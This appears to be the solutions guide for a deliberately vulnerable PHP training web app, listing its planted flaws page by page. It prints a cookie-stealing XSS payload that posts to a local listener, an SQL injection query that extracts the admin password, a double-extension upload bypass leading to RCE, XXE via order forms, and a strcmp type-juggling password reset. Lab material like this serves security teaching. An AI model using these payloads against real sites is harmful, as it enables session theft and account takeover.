
##Solutions & vulnerability locations

**Comments - comments.php**
Name and Comment field should accept something like:
```
{
'name':'name',
'comment':'<script>fetch("http://127.0.0.1:8000",{method: "post",mode: "no-cors",body:document.cookie});</script>'
}
```
Comments and names are stored on the MySQL db and automatically loaded when the page is refreshed.

**Order Form - order.php**
Saves an order as an XML file. Only the webadmin account can review orders. Send some XXE here for later.

**Products Page - Products.php**
Very open to SQL injection.  Once authenticated as a base user, the attacker can get the webadmin password with something in the product search like:
```
1 UNION SELECT NULL, Username, Password FROM users WHERE Username = "webadmin"
```

**Gallery - social.php**
Reasonable file upload filter, but still weak.  This filter will catch files ending in php, but not php.jpg.  This should work:
`evil.php.jpeg`
Then, if an attacker has also grabbed the webadmin password from the products page, from the admin portal they can rename uploads and change the file to `evil.php`.

##Admin-only Pages

**Admin - admin_page.php**
This page contains a way to list uploaded image files and rename or delete them, as well as a way to view XML order forms. Both allow for RCE and potentially a reverse shell, depending on the exploitation path.  Maliciously uploaded image files can be renamed, and XML orders can be viewed.

**Reset Password - reset_pw.php**
PHP type juggling.  This page does not check to see if the user for which the password is being changed is the same user that is logged in.  It just sets the $username_entered variable equal to whatever $_POST['Username'] is.  It does, however, check the $new_password against the $username_entered password in the DB.  

The syntax in the logic is vulnerable:
```
if (($_POST['new_password'] == $_POST['new_password2']) && (strcmp($_POST['old_password'],$password) == 0)){
```
The first half of this section checks that the new password is entered twice, identically.  The second half compares the DB and user-supplied password to ensure that they are the same.  The `== 0` comparison is weak.  PHP evaluates empty arrays as false, which is also "equal to" zero.  Intercepting the HTTP request and changing the 'old_password' to an empty array should allow an attacker to reset the webadmin's password to whatever they like.

**View Orders - view_order.php**
This page renders user provided XML (in the form of an "order form") to the webadmin user.  This should be useful for leveraging XXE attacks submitted via the 'Order Form' page.

**continue.php**
This page reflects the user name back to an authenticated user.  Untested, but likely will accept XSS or other input based attacks.  User name is committed to the DB.  No functionality to add a new user or "sign up" is included in the site currently, so it would be difficult to exploit without DB injection.

**db.php**
Hard-coded database credentials are not securely stored, and are left in the default webroot file path.




## No deliberate exploit path, but probably vulnerable anyway due to lazy development ##
- **login.php**
- **logout.php**
- **php.ini** This is just here for docker. Whatever.
- **phpinfo.php** Included for fun, troubleshooting, & recon.
- **continue.php**
This page reflects the user name back to an authenticated user.  Untested, but likely will accept XSS or other input based attacks.  User name is committed to the DB.  No functionality to add a new user or "sign up" is included in the site currently, so it would be difficult to exploit without DB injection.
